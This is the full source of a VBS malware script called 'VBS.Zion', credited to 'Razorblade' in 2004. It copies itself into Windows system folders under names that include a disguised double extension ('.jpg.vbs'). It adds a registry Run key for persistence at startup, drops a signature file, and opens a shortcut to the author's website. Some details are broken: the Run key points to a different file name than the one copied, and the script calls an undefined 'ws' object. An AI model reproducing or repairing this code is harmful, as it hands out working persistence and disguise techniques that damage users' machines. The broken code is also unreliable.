' VBS.Zion
' by Razorblade

On Error Resume Next

set fs = CreateObject("Scripting.FileSystemObject")
set co = CreateObject("WScript.Shell")
set c = fs.GetFile(WScript.ScriptFullName)

c.Copy("C:\WINDOWS\zion32.jpg.vbs")
c.Copy("C:\WINDOWS\system\zion.vbs")
c.Copy("C:\WINDOWS\system32\zion.vbs")
c.Copy("C:\Pro~1\zion.vbs")

set zion = fs.CreateTextFile("C:\zion.txt")
zion.WriteLine "VBS.Zion"
zion.WriteLine "by Razorblade"
zion.WriteLine "============="
zion.WriteLine "Member Of The Legion Of Death"
zion.close

On Error Resume Next
co.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\ZioN","C:\WINDOWS\zion.jpg.vbs","REG_SZ"

On Error Resume Next
msgbox "THe ZioN","16","By RaZoRBLaDe"
Set oUrlLink = co.CreateShortcut("VBS.Zion.URL")
oUrlLink.TargetPath = "http://www.razor-hacks.de.ms"
oUrlLink.Save
ws.Run ("VBS.Zion.URL")

' Code End
' Written by Razorblade
' 2004